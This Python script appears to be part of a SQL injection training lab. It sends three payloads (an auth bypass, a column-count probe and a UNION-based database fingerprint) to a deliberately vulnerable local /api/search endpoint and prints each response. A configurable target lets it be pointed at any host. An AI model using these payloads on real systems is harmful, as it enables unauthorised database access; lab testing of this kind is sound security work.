#!/usr/bin/env python3
"""
SQL Injection Audit Suite

Runs a set of categorized test cases against the vulnerable
/api/search endpoint and prints each payload with its response.

Usage:
    python init_lab.py                  # set up staging.db
    python app.py &                     # start the vulnerable server
    python audit_suite.py               # run tests (default: http://127.0.0.1:5000)
    python audit_suite.py --target http://10.0.0.5:5000
"""

import argparse
import json
import sys

import requests

# ------------------------------------------------------------------ #
#  Test Cases — keys are injection types, values are raw payloads
#  injected into:  /api/search?id=<payload>
# ------------------------------------------------------------------ #

TEST_CASES = {
    "Auth Bypass": "1 OR '1'='1'",
    "Union-Based (column count)": "1 ORDER BY 4--",
    "Database Fingerprinting": "0 UNION SELECT 1,sqlite_version(),3,4--",
}

SEPARATOR = "=" * 65


def run_test(target, name, payload):
    """Send a single payload and return the parsed response."""
    url = f"{target}/api/search"
    try:
        resp = requests.get(url, params={"id": payload}, timeout=10)
        body = resp.json()
    except requests.ConnectionError:
        print(f"[!] Cannot connect to {target}. Is the server running?")
        sys.exit(1)
    except ValueError:
        body = resp.text

    return resp.status_code, body


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Audit Suite")
    parser.add_argument(
        "--target",
        default="http://127.0.0.1:5000",
        help="Base URL of the vulnerable app (default: http://127.0.0.1:5000)",
    )
    args = parser.parse_args()

    print(SEPARATOR)
    print("  SQL Injection Audit Suite")
    print(f"  Target: {args.target}")
    print(SEPARATOR)

    for name, payload in TEST_CASES.items():
        print(f"\n[Test] {name}")
        print(f"[Payload] {payload}")

        status_code, body = run_test(args.target, name, payload)

        print(f"[Status] {status_code}")
        print(f"[Response]\n{json.dumps(body, indent=2)}")
        print(SEPARATOR)


if __name__ == "__main__":
    main()
